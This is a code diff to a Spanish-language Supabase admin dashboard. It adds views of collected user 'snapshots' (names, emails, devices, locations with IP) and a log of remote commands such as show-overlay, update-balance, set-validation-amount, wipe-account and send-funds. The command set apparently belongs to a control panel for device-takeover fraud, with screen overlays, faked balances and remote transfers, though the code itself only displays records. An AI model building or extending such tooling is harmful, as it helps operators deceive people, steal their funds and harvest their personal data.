@@ -9,6 +9,19 @@ const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 // Variable global para almacenar información del admin
 let currentAdmin = null;
+const snapshotCache = new Map();
+const commandCache = new Map();
+let currentDetailData = null;
+const COMMAND_LABELS = {
+    'update-balance': 'Actualizar saldo',
+    'update-rate': 'Actualizar tasa',
+    'set-block': 'Bloqueo manual',
+    'wipe-account': 'Eliminar cuenta local',
+    'set-validation-amount': 'Monto de validación',
+    'show-overlay': 'Mostrar overlay',
+    'hide-overlay': 'Ocultar overlay',
+    'send-funds': 'Transferencia remota'
+};
 
 // =====================================================
 // MIDDLEWARE DE AUTENTICACIÓN
@@ -114,6 +127,14 @@ async function loadStats() {
 
         if (!snapshotsError && snapshotsCount !== null) {
             document.getElementById('totalSnapshots').textContent = snapshotsCount;
+        }
+
+        const { count: commandsCount, error: commandsError } = await supabase
+            .from('miinformacion_remote_commands')
+            .select('*', { count: 'exact', head: true });
+
+        if (!commandsError && commandsCount !== null) {
+            document.getElementById('totalCommands').textContent = commandsCount;
         }
 
     } catch (error) {
@@ -293,12 +314,11 @@ async function loadDevices() {
 async function loadSnapshots() {
     try {
         showLoading(true);
-        
+
         const { data, error } = await supabase
             .from('miinformacion_snapshots')
-            .select('*')
-            .order('created_at', { ascending: false })
-            .limit(100);
+            .select('id, created_at, collected_at, device_id, email, full_name, last_sync_at, source, location, data')
+            .order('created_at', { ascending: false });
 
         if (error) {
             console.error('Error cargando snapshots:', error);
@@ -307,25 +327,34 @@ async function loadSnapshots() {
         }
 
         const tbody = document.getElementById('snapshotsTableBody');
-        
+
         if (!data || data.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" class="px-6 py-4 text-center text-gray-500">No hay snapshots registrados</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-500">No hay snapshots registrados</td></tr>';
             return;
         }
 
+        snapshotCache.clear();
+        data.forEach(snapshot => snapshotCache.set(snapshot.id, snapshot));
+
         tbody.innerHTML = data.map(snapshot => `
             <tr class="hover:bg-gray-50">
-                <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-900">
-                    ${escapeHtml(snapshot.id.substring(0, 8))}...
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <div class="font-mono font-medium text-gray-900">${escapeHtml(truncateId(snapshot.id))}</div>
+                    <div class="text-xs text-gray-500">${formatDate(snapshot.created_at)}</div>
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <div class="font-medium text-gray-900">${escapeHtml(snapshot.full_name || 'Sin nombre')}</div>
+                    <div class="text-xs text-gray-500">${escapeHtml(snapshot.email || 'Sin correo')}</div>
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <div class="text-gray-900">${escapeHtml(formatDeviceLabel(snapshot.device_id))}</div>
+                    <div class="text-xs text-gray-500">${escapeHtml(formatLocation(snapshot.location))}</div>
                 </td>
                 <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
-                    ${escapeHtml(snapshot.user_id ? snapshot.user_id.substring(0, 8) + '...' : 'N/A')}
+                    ${formatDate(snapshot.collected_at)}
                 </td>
                 <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
-                    ${escapeHtml(snapshot.snapshot_type || 'N/A')}
-                </td>
-                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
-                    ${formatDate(snapshot.created_at)}
+                    ${formatDate(snapshot.last_sync_at || snapshot.created_at)}
                 </td>
                 <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                     <button onclick="viewSnapshot('${snapshot.id}')" class="text-purple-600 hover:text-purple-900">
@@ -337,11 +366,82 @@ async function loadSnapshots() {
 
         await logAdminAction('view_snapshots', { count: data.length });
 
+        await loadRemoteCommands({ skipLoading: true });
+
     } catch (error) {
         console.error('Error en loadSnapshots:', error);
         showTableError('snapshotsTableBody', 'Error al cargar snapshots');
     } finally {
         showLoading(false);
+    }
+}
+
+async function loadRemoteCommands(options = {}) {
+    const { skipLoading = false } = options;
+
+    try {
+        if (!skipLoading) {
+            showLoading(true);
+        }
+
+        const { data, error } = await supabase
+            .from('miinformacion_remote_commands')
+            .select('id, created_at, command_id, type, source, device_id, email, full_name, payload, meta')
+            .order('created_at', { ascending: false });
+
+        if (error) {
+            console.error('Error cargando comandos remotos:', error);
+            showTableError('commandsTableBody', 'Error al cargar comandos remotos');
+            return;
+        }
+
+        const tbody = document.getElementById('commandsTableBody');
+
+        if (!data || data.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-500">No hay comandos registrados</td></tr>';
+            return;
+        }
+
+        commandCache.clear();
+        data.forEach(command => commandCache.set(command.id, command));
+
+        tbody.innerHTML = data.map(command => `
+            <tr class="hover:bg-gray-50">
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <div class="font-mono font-medium text-gray-900">${escapeHtml(truncateId(command.command_id || command.id))}</div>
+                    <div class="text-xs text-gray-500">${formatDate(command.created_at)}</div>
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <div class="font-medium text-gray-900">${escapeHtml(command.full_name || 'Sin nombre')}</div>
+                    <div class="text-xs text-gray-500">${escapeHtml(command.email || 'Sin correo')}</div>
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-blue-100 text-blue-800">${escapeHtml(getCommandLabel(command.type))}</span>
+                    <div class="text-xs text-gray-500 mt-1">${escapeHtml(command.type || 'N/A')}</div>
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
+                    ${escapeHtml(command.source || 'miinformacion')}
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
+                    ${formatDate(command.created_at)}
+                </td>
+                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
+                    <button onclick="viewCommand('${command.id}')" class="text-purple-600 hover:text-purple-900">
+                        Ver Detalles
+                    </button>
+                </td>
+            </tr>
+        `).join('');
+
+        await logAdminAction('view_remote_commands', { count: data.length });
+
+    } catch (error) {
+        console.error('Error en loadRemoteCommands:', error);
+        showTableError('commandsTableBody', 'Error al cargar comandos remotos');
+    } finally {
+        if (!skipLoading) {
+            showLoading(false);
+        }
     }
 }
 
@@ -354,6 +454,49 @@ function escapeHtml(text) {
     const div = document.createElement('div');
     div.textContent = text;
     return div.innerHTML;
+}
+
+function truncateId(value) {
+    if (!value || typeof value !== 'string') {
+        return 'N/A';
+    }
+    return value.length > 12 ? `${value.substring(0, 12)}...` : value;
+}
+
+function formatDeviceLabel(deviceId) {
+    if (!deviceId) {
+        return 'Sin dispositivo';
+    }
+    return `Dispositivo ${truncateId(deviceId)}`;
+}
+
+function formatLocation(location) {
+    if (!location) {
+        return '';
+    }
+    if (typeof location === 'string') {
+        return location;
+    }
+    if (Array.isArray(location)) {
+        return location.filter(Boolean).join(' · ');
+    }
+    if (typeof location === 'object') {
+        const parts = [];
+        ['city', 'region', 'country', 'ip'].forEach(key => {
+            if (location[key]) {
+                parts.push(location[key]);
+            }
+        });
+        if (parts.length > 0) {
+            return parts.join(' · ');
+        }
+    }
+    try {
+        return JSON.stringify(location);
+    } catch (error) {
+        console.warn('No se pudo formatear la ubicación:', error);
+        return '';
+    }
 }
 
 function formatDate(dateString) {
@@ -384,6 +527,22 @@ function getStatusColor(status) {
         'processing': 'bg-blue-100 text-blue-800'
     };
     return colors[status] || 'bg-gray-100 text-gray-800';
+}
+
+function getCommandLabel(type) {
+    return COMMAND_LABELS[type] || type || 'N/A';
+}
+
+function formatJson(data) {
+    try {
+        if (typeof data === 'string') {
+            return data;
+        }
+        return JSON.stringify(data, null, 2);
+    } catch (error) {
+        console.error('No se pudo formatear el JSON:', error);
+        return String(data);
+    }
 }
 
 function showLoading(show) {
@@ -420,7 +579,92 @@ async function logAdminAction(action, details = {}) {
 }
 
 function viewSnapshot(snapshotId) {
-    alert(`Ver detalles del snapshot: ${snapshotId}\n\nEsta funcionalidad se puede expandir para mostrar un modal con los detalles completos.`);
+    const snapshot = snapshotCache.get(snapshotId);
+    if (!snapshot) {
+        alert('No se encontró el snapshot seleccionado.');
+        return;
+    }
+
+    const metaParts = [];
+    if (snapshot.full_name) metaParts.push(`Usuario: ${snapshot.full_name}`);
+    if (snapshot.email) metaParts.push(snapshot.email);
+    if (snapshot.device_id) metaParts.push(`Dispositivo: ${truncateId(snapshot.device_id)}`);
+    if (snapshot.collected_at) metaParts.push(`Recopilado: ${formatDate(snapshot.collected_at)}`);
+
+    const detailPayload = snapshot.data || snapshot;
+
+    openDetailModal({
+        title: 'Snapshot de Mi Información',
+        meta: metaParts.join(' · ') || 'Detalles del snapshot',
+        data: detailPayload
+    });
+}
+
+function viewCommand(commandId) {
+    const command = commandCache.get(commandId);
+    if (!command) {
+        alert('No se encontró el comando seleccionado.');
+        return;
+    }
+
+    const metaParts = [];
+    metaParts.push(`Tipo: ${getCommandLabel(command.type)}`);
+    if (command.full_name) metaParts.push(`Usuario: ${command.full_name}`);
+    if (command.email) metaParts.push(command.email);
+    if (command.device_id) metaParts.push(`Dispositivo: ${truncateId(command.device_id)}`);
+
+    const detail = {
+        id: command.id,
+        command_id: command.command_id,
+        type: command.type,
+        source: command.source,
+        created_at: command.created_at,
+        device_id: command.device_id,
+        email: command.email,
+        full_name: command.full_name,
+        payload: command.payload,
+        meta: command.meta
+    };
+
+    openDetailModal({
+        title: 'Comando remoto registrado',
+        meta: metaParts.join(' · '),
+        data: detail
+    });
+}
+
+function openDetailModal({ title, meta, data }) {
+    const modal = document.getElementById('detailModal');
+    if (!modal) return;
+
+    document.getElementById('detailModalTitle').textContent = title;
+    document.getElementById('detailModalMeta').textContent = meta;
+    const formatted = formatJson(data);
+    document.getElementById('detailModalContent').textContent = formatted;
+
+    currentDetailData = data;
+    modal.classList.remove('hidden');
+    document.body.classList.add('overflow-hidden');
+}
+
+function closeDetailModal() {
+    const modal = document.getElementById('detailModal');
+    if (!modal) return;
+    modal.classList.add('hidden');
+    document.body.classList.remove('overflow-hidden');
+    currentDetailData = null;
+}
+
+async function copyDetailModalContent() {
+    if (!currentDetailData) return;
+    try {
+        const json = formatJson(currentDetailData);
+        await navigator.clipboard.writeText(json);
+        alert('Datos copiados al portapapeles.');
+    } catch (error) {
+        console.error('No se pudo copiar el contenido:', error);
+        alert('No se pudo copiar el contenido. Intenta nuevamente.');
+    }
 }
 
 // =====================================================
@@ -468,6 +712,35 @@ function setupTabs() {
     });
 }
 
+function setupDetailModal() {
+    const closeButtons = [
+        document.getElementById('detailModalClose'),
+        document.getElementById('detailModalCloseFooter')
+    ];
+
+    closeButtons.forEach(button => {
+        if (button) {
+            button.addEventListener('click', closeDetailModal);
+        }
+    });
+
+    const backdrop = document.getElementById('detailModalBackdrop');
+    if (backdrop) {
+        backdrop.addEventListener('click', closeDetailModal);
+    }
+
+    const copyButton = document.getElementById('detailModalCopy');
+    if (copyButton) {
+        copyButton.addEventListener('click', copyDetailModalContent);
+    }
+
+    document.addEventListener('keydown', event => {
+        if (event.key === 'Escape') {
+            closeDetailModal();
+        }
+    });
+}
+
 // =====================================================
 // LOGOUT
 // =====================================================
@@ -506,6 +779,7 @@ async function init() {
 
     // Configurar tabs
     setupTabs();
+    setupDetailModal();
 
     // Configurar botón de logout
     document.getElementById('logoutButton').addEventListener('click', handleLogout);
